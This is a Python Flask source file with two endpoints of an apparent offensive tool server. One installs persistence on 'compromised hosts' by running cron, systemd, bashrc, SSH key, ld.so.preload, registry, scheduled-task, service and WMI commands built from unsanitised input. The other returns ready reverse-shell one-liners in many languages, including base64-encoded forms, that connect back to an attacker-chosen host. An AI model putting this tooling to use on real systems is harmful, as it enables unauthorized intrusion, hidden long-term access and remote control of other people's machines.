@app.route("/api/tools/persistence-manager", methods=["POST"])
def persistence_manager():
    """Manage persistence mechanisms on compromised hosts"""
    try:
        params = request.get_json(silent=True) or {}
        technique = params.get("technique", "")
        platform = params.get("platform", "linux")
        payload = params.get("payload", "")
        name = params.get("name", "system-update")
        schedule = params.get("schedule", "")
        action = params.get("action", "install")
        additional_args = params.get("additional_args", "")

        if not technique:
            return jsonify({
                "success": True,
                "available_techniques": {
                    "linux": ["crontab", "systemd", "bashrc", "ssh_key", "ld_preload"],
                    "windows": ["registry", "scheduled_task", "startup_folder", "service", "wmi"]
                },
                "usage": "Provide technique, platform, and payload parameters"
            })

        result = {}

        if platform == "linux":
            if technique == "crontab":
                if action == "install":
                    schedule = schedule or "*/5 * * * *"
                    cmd = f"(crontab -l 2>/dev/null; echo \"{schedule} {payload}\") | crontab -"
                else:
                    cmd = f"crontab -l | grep -v '{payload}' | crontab -"
            elif technique == "systemd":
                service_content = f"""[Unit]
Description={name}
After=network.target

[Service]
Type=simple
ExecStart={payload}
Restart=always

[Install]
WantedBy=multi-user.target"""
                cmd = f"echo '{service_content}' > /etc/systemd/system/{name}.service && systemctl daemon-reload && systemctl enable {name} && systemctl start {name}"
            elif technique == "bashrc":
                cmd = f"echo '{payload}' >> ~/.bashrc"
            elif technique == "ssh_key":
                cmd = f"echo '{payload}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
            elif technique == "ld_preload":
                cmd = f"echo '{payload}' > /etc/ld.so.preload"
            else:
                return jsonify({"error": f"Unknown Linux technique: {technique}"}), 400
        elif platform == "windows":
            if technique == "registry":
                cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "{name}" /t REG_SZ /d "{payload}" /f'
            elif technique == "scheduled_task":
                schedule = schedule or "ONLOGON"
                cmd = f'schtasks /create /tn "{name}" /tr "{payload}" /sc {schedule} /f'
            elif technique == "startup_folder":
                cmd = f'copy "{payload}" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'
            elif technique == "service":
                cmd = f'sc create {name} binpath= "{payload}" start= auto'
            elif technique == "wmi":
                cmd = f'wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="{name}", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"'
            else:
                return jsonify({"error": f"Unknown Windows technique: {technique}"}), 400
        else:
            return jsonify({"error": f"Unsupported platform: {platform}"}), 400

        logger.info(f"🔧 Executing persistence technique: {technique} on {platform}")
        result = execute_command(cmd)
        result["technique"] = technique
        result["platform"] = platform
        logger.info(f"📊 Persistence technique {technique} completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in persistence-manager endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500


@app.route("/api/tools/reverse-shell-generator", methods=["POST"])
def reverse_shell_generator():
    """Generate reverse shell payloads for multiple platforms and languages"""
    try:
        params = request.get_json(silent=True) or {}
        lhost = params.get("lhost", "")
        lport = params.get("lport", "4444")
        shell_type = params.get("shell_type", "bash")
        encoding = params.get("encoding", "")
        list_types = params.get("list_types", False)

        if list_types:
            return jsonify({
                "success": True,
                "available_types": [
                    "bash", "sh", "python", "python3", "perl", "php", "ruby",
                    "netcat", "ncat", "powershell", "java", "node", "groovy",
                    "lua", "awk", "socat", "msfvenom_linux", "msfvenom_windows"
                ]
            })

        if not lhost:
            return jsonify({"error": "lhost parameter is required"}), 400

        shells = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "sh": f"/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "ruby": f"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{lhost}\",\"{lport}\");loop{{c.gets.chomp!;(IO.popen(l,\"r\"){{|io|c.print io.read}})rescue nil}}'",
            "netcat": f"nc -e /bin/sh {lhost} {lport}",
            "ncat": f"ncat {lhost} {lport} -e /bin/sh",
            "powershell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            "java": f"Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]{{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done\"}});",
            "node": f"require('child_process').exec('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')",
            "groovy": f"String host=\"{lhost}\";int port={lport};String cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);",
            "lua": f"os.execute('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')",
            "awk": f"awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c)}} }} while(c != \"exit\") close(s)}}}}'",
            "socat": f"socat TCP:{lhost}:{lport} EXEC:/bin/sh",
            "msfvenom_linux": f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf",
            "msfvenom_windows": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe",
        }

        if shell_type not in shells:
            return jsonify({"error": f"Unknown shell type: {shell_type}. Use list_types=true to see available types."}), 400

        payload = shells[shell_type]

        if encoding == "base64":
            import base64
            payload_encoded = base64.b64encode(payload.encode()).decode()
            if shell_type == "powershell":
                payload = f"powershell -e {payload_encoded}"
            elif shell_type in ["bash", "sh"]:
                payload = f"echo {payload_encoded} | base64 -d | bash"

        return jsonify({
            "success": True,
            "shell_type": shell_type,
            "lhost": lhost,
            "lport": lport,
            "payload": payload,
            "encoding": encoding or "none",
            "timestamp": datetime.now().isoformat()
        })
    except Exception as e:
        logger.error(f"💥 Error in reverse-shell-generator endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500


